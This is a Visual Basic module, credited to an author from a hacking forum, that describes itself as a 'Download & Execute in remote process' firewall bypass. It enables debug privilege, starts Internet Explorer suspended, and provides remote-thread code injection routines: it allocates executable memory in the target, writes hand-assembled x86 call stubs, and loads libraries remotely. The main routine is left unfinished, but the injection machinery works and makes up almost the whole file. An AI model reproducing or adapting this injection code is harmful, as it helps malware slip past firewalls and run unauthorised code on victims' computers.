Attribute VB_Name = "Module5"
Option Explicit
'---------------------------------------------------------------------------------------
' Module      : ModDloadExec
' DateTime    : 04/08/2008 11:42
' Author      : obsol337
' WebPage     : http://hackhound.org
' Purpose     : Download & Execute in remote process (fwb++)
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' History     : 04/08/2008 First Release
' Credits     : Ark remote api example
'---------------------------------------------------------------------------------------
Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpDest As Any, lpSource As Any, ByVal cBytes As Long)

Declare Function GetCurrentProcess Lib "kernel32" () As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Declare Function LookupPrivilegeValueA Lib "advapi32" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LARGE_INTEGER) As Long
Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, ByRef NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, ByRef PreviousState As Any, ByRef ReturnLength As Any) As Long
Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Declare Function GetExitCodeThread Lib "kernel32" (ByVal hThread As Long, lpExitCode As Long) As Long
Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Declare Function VirtualFreeEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const SE_PRIVILEGE_ENABLED = &H2
Const ANYSIZE_ARRAY = 1
Const TOKEN_ADJUST_PRIVILEGES = &H20
Const TOKEN_QUERY = &H8
Const INFINITE = -1&
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const MEM_RELEASE = &H8000
Const PAGE_READWRITE = &H4&
Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const CREATE_SUSPENDED = &H4

Type LARGE_INTEGER
  LowPart As Long
  HighPart As Long
End Type

Type LUID_AND_ATTRIBUTES
  pLuid As LARGE_INTEGER
  Attributes As Long
End Type

Type TOKEN_PRIVILEGES
  PrivilegeCount As Long
  Privileges(ANYSIZE_ARRAY) As LUID_AND_ATTRIBUTES
End Type

Public Enum ARG_FLAG
   arg_Value
   arg_Pointer
End Enum

Public Type API_DATA
   lpData       As Long      'Pointer to data or real data
   dwDataLength As Long      'Data length
   argType      As ARG_FLAG  'ByVal or ByRef?
   bOut         As Boolean   'Is this argument [OUT]?
End Type

Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long        'LPBYTE
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Dim hKernel           As Long
Dim lpGetModuleHandle As Long
Dim lpLoadLibrary     As Long
Dim lpFreeLibrary     As Long
Dim lpGetProcAddress  As Long
Dim bKernelInit       As Boolean

Dim abAsm() As Byte 'buffer for assembly code
Dim lCP As Long     'used to keep track of latest byte added to code

Public Sub dfwb()
Dim pi As PROCESS_INFORMATION
Dim si As STARTUPINFO
Dim pid As Long
Sleep 5000
Call EnableDebugPrivNT 'Then Exit Sub
Call CreateProcessA(vbNullString, "C:\Program Files\Internet Explorer\iexplore.exe", 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi)
'hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)


Call CloseHandle(pi.hProcess)
    
End Sub



Public Function CallAPIRemote(ByVal hProcess As Long, ByVal LibName As String, ByVal FuncName As String, ByVal nParams As Long, data() As API_DATA, Optional ByVal dwTimeOut As Long = INFINITE) As Long
   
Dim hLib As Long, fnAddress As Long
Dim bNeedUnload As Boolean
Dim locData(1) As API_DATA
      
   hLib = GetModuleHandleRemote(hProcess, LibName)
   
If hLib = 0 Then
    hLib = LoadLibraryRemote(hProcess, LibName)
    If hLib = 0 Then Exit Function
    bNeedUnload = True
End If
   
   fnAddress = GetProcAddressRemote(hProcess, hLib, FuncName)
   
If fnAddress Then
    CallAPIRemote = CallFunctionRemote(hProcess, fnAddress, nParams, data, dwTimeOut)
End If

   If bNeedUnload Then Call FreeLibraryRemote(hProcess, hLib)
End Function

'Main function which do the job
Function CallFunctionRemote(ByVal hProcess As Long, ByVal func_addr As Long, ByVal nParams As Long, data() As API_DATA, Optional ByVal dwTimeOut As Long = INFINITE) As Long
Dim hThread As Long, ThreadId As Long
Dim Addr As Long, ret As Long, h As Long, i As Long
Dim codeStart As Long
Dim param_addr() As Long
   
If nParams = 0 Then
    CallFunctionRemote = CallFunctionRemoteOneParam(hProcess, func_addr, 0, 0, 0, 0)
ElseIf nParams = 1 Then
    CallFunctionRemote = CallFunctionRemoteOneParam(hProcess, func_addr, 1, _
    data(0).lpData, data(0).dwDataLength, data(0).argType, _
    data(0).bOut)
End If
   
   ReDim abAsm(50 + 6 * nParams)
   ReDim param_addr(nParams - 1)
   
   lCP = 0
   Addr = VirtualAllocEx(ByVal hProcess, ByVal 0&, ByVal UBound(abAsm) + 1, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
   
   codeStart = GetAlignedCodeStart(Addr)
   lCP = codeStart - Addr
   
For i = 0 To lCP - 1
    abAsm(i) = &HCC
Next
   PrepareStack 1 'remove ThreadFunc lpParam

   For i = nParams To 1 Step -1
   
       AddByteToCode &H68 'push wwxxyyzz
If data(i - 1).argType = arg_Value Then
    AddLongToCode data(i - 1).lpData
Else

    param_addr(i - 1) = VirtualAllocEx(ByVal hProcess, ByVal 0&, ByVal data(i - 1).dwDataLength, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
If param_addr(i - 1) = 0 Then GoTo CleanUp

If WriteProcessMemory(hProcess, ByVal param_addr(i - 1), ByVal data(i - 1).lpData, data(i - 1).dwDataLength, ret) = 0 Then GoTo CleanUp
    AddLongToCode param_addr(i - 1)
End If

   Next
   
    AddCallToCode func_addr, Addr + VarPtr(abAsm(lCP)) - VarPtr(abAsm(0))
    AddByteToCode &HC3
    AddByteToCode &HCC
   
If WriteProcessMemory(hProcess, ByVal Addr, abAsm(0), UBound(abAsm) + 1, ret) = 0 Then GoTo CleanUp
    hThread = CreateRemoteThread(hProcess, 0, 0, ByVal codeStart, data(0).lpData, 0&, ThreadId)
If hThread Then
    ret = WaitForSingleObject(hThread, dwTimeOut)
If ret = 0 Then ret = GetExitCodeThread(hThread, h)
End If

   CallFunctionRemote = h
   
For i = 0 To nParams - 1
If param_addr(i) <> 0 Then
If data(i).bOut Then
    ReadProcessMemory hProcess, ByVal param_addr(i), ByVal data(i).lpData, data(i).dwDataLength, ret
End If
End If
Next i

CleanUp:
   VirtualFreeEx hProcess, ByVal Addr, 0, MEM_RELEASE
For i = 0 To nParams - 1
    If param_addr(i) <> 0 Then VirtualFreeEx hProcess, ByVal param_addr(i), 0, MEM_RELEASE
Next i
End Function

Function CallFunctionRemoteOneParam(ByVal hProcess As Long, ByVal func_addr As Long, _
                                    ByVal nParams As Long, ByVal lngVal As Long, _
                                    ByVal dwSize As Long, ByVal argType As ARG_FLAG, _
                                    Optional ByVal bReturn As Boolean) As Long
   Dim hThread As Long, ThreadId As Long
   Dim Addr As Long, ret As Long, h As Long, i As Long
   Dim lngTemp As Long
   
If nParams = 0 Then
    bReturn = False
Else
If argType = arg_Pointer Then
    Addr = VirtualAllocEx(ByVal hProcess, ByVal 0&, ByVal dwSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
If Addr = 0 Then Exit Function
    Call WriteProcessMemory(hProcess, ByVal Addr, ByVal lngVal, dwSize, ret)
    lngTemp = Addr
Else
    lngTemp = lngVal
End If
   End If
   hThread = CreateRemoteThread(hProcess, 0, 0, ByVal func_addr, lngTemp, 0&, ThreadId)
If hThread Then
    ret = WaitForSingleObject(hThread, 1000)
If ret = 0 Then ret = GetExitCodeThread(hThread, h)
    CallFunctionRemoteOneParam = h
    CloseHandle hThread
End If
If bReturn Then
If Addr <> 0 Then
    ReadProcessMemory hProcess, ByVal Addr, ByVal lngVal, dwSize, ret
    VirtualFreeEx hProcess, ByVal Addr, 0, MEM_RELEASE
End If
End If
End Function

Public Function GetModuleHandleRemote(ByVal hProcess As Long, ByVal LibName As String) As Long
Dim hThread As Long, ThreadId As Long
Dim Addr As Long, ret As Long, h As Long
   
If Not InitKernel Then Exit Function

If GetModuleHandleA(LibName) = hKernel Then
    GetModuleHandleRemote = hKernel
    Exit Function
End If
   
    Addr = VirtualAllocEx(ByVal hProcess, ByVal 0&, ByVal Len(LibName) + 1, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
If Addr = 0 Then Exit Function

If WriteProcessMemory(hProcess, ByVal Addr, ByVal LibName, Len(LibName), ret) Then
    hThread = CreateRemoteThread(hProcess, 0, 0, ByVal lpGetModuleHandle, Addr, 0&, ThreadId)
    
If hThread Then
    ret = WaitForSingleObject(hThread, 500)
If ret = 0 Then ret = GetExitCodeThread(hThread, h)
End If

End If

    VirtualFreeEx hProcess, ByVal Addr, 0, MEM_RELEASE
    CloseHandle hThread
    GetModuleHandleRemote = h
End Function

Public Function LoadLibraryRemote(ByVal hProcess As Long, ByVal LibName As String) As Long
    If Not InitKernel Then Exit Function
    
Dim hThread As Long, ThreadId As Long
Dim Addr As Long, ret As Long, h As Long
   
If GetModuleHandleA(LibName) = hKernel Then
    LoadLibraryRemote = hKernel
    Exit Function
End If
   
    Addr = VirtualAllocEx(ByVal hProcess, ByVal 0&, ByVal Len(LibName) + 1, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
If Addr = 0 Then Exit Function
If WriteProcessMemory(hProcess, ByVal Addr, ByVal LibName, Len(LibName), ret) Then
    hThread = CreateRemoteThread(hProcess, 0, 0, ByVal lpLoadLibrary, Addr, 0&, ThreadId)
If hThread Then
    ret = WaitForSingleObject(hThread, 500)
If ret = 0 Then ret = GetExitCodeThread(hThread, h)
End If
End If
   LoadLibraryRemote = h
End Function

Public Function GetProcAddressRemote(ByVal hProcess As Long, ByVal hLib As Long, ByVal fnName As String) As Long
    If Not InitKernel Then Exit Function
Dim localData(1) As API_DATA
Dim abName() As Byte

If hLib = hKernel Then
    GetProcAddressRemote = GetProcAddress(hKernel, fnName)
    Exit Function
End If

With localData(0)
    .lpData = hLib
    .dwDataLength = 4
    .argType = arg_Value
End With
    fnName = fnName & Chr(0)
    abName = StrConv(fnName, vbFromUnicode)
With localData(1)
    .lpData = VarPtr(abName(0))
    .dwDataLength = UBound(abName) + 1
    .argType = arg_Pointer
End With
    GetProcAddressRemote = CallFunctionRemote(hProcess, lpGetProcAddress, 2, localData)
End Function

Public Function FreeLibraryRemote(ByVal hProcess As Long, ByVal hLib As Long) As Long
Dim hThread As Long, ThreadId As Long, h As Long, ret As Long
If hLib = hKernel Then
    FreeLibraryRemote = True
    Exit Function
End If
   
    hThread = CreateRemoteThread(hProcess, 0, 0, ByVal lpFreeLibrary, hLib, 0&, ThreadId)
If hThread Then
    ret = WaitForSingleObject(hThread, 500)
    If ret = 0 Then ret = GetExitCodeThread(hThread, h)
End If
    CloseHandle hThread
    FreeLibraryRemote = h
End Function

'============Private routines to prepare asm (op)code===========
Sub AddCallToCode(ByVal dwAddress As Long, ByVal BaseAddr As Long)
    AddByteToCode &HE8
    AddLongToCode dwAddress - BaseAddr - 5
End Sub

Sub AddLongToCode(ByVal lng As Long)
Dim i As Integer
Dim byt(3) As Byte

    CopyMemory byt(0), lng, 4
For i = 0 To 3
    AddByteToCode byt(i)
Next
End Sub

Sub AddByteToCode(ByVal byt As Byte)
    abAsm(lCP) = byt
    lCP = lCP + 1
End Sub

Function GetAlignedCodeStart(ByVal dwAddress As Long) As Long
    GetAlignedCodeStart = dwAddress + (15 - (dwAddress - 1) Mod 16)
    If (15 - (dwAddress - 1) Mod 16) = 0 Then GetAlignedCodeStart = GetAlignedCodeStart + 16
End Function

Sub PrepareStack(ByVal numParamsToRemove As Long)
Dim i As Long
If numParamsToRemove = 0 Then Exit Sub
    AddByteToCode &H58     'pop eax -  pop return address
For i = 1 To numParamsToRemove
    AddByteToCode &H59 'pop ecx -  kill param
Next i
    AddByteToCode &H50     'push eax - put return address back
End Sub

Sub ClearStack(ByVal nParams As Long)
   Dim i As Long
   For i = 1 To nParams
       AddByteToCode &H59  'pop ecx - remove params from stack
   Next
End Sub

'==========Get main kernel32 functions addresses=========
Function InitKernel() As Boolean

If bKernelInit Then
    InitKernel = True
    Exit Function
End If

   hKernel = GetModuleHandleA("kernel32")
If hKernel = 0 Then Exit Function
   lpGetProcAddress = GetProcAddress(hKernel, "GetProcAddress")
   lpGetModuleHandle = GetProcAddress(hKernel, "GetModuleHandleA")
   lpLoadLibrary = GetProcAddress(hKernel, "LoadLibraryA")
   lpFreeLibrary = GetProcAddress(hKernel, "FreeLibrary")
   InitKernel = True
   bKernelInit = True
End Function

Function EnableDebugPrivNT() As Boolean
Dim hToken As Long
Dim li As LARGE_INTEGER
Dim tkp As TOKEN_PRIVILEGES
  
If OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken) = 0 Then Exit Function
  
If LookupPrivilegeValueA("", "SeDebugPrivilege", li) = 0 Then Exit Function
  
    tkp.PrivilegeCount = 1
    tkp.Privileges(0).pLuid = li
    tkp.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
    EnableDebugPrivNT = AdjustTokenPrivileges(hToken, False, tkp, 0, ByVal 0&, 0)
  
End Function




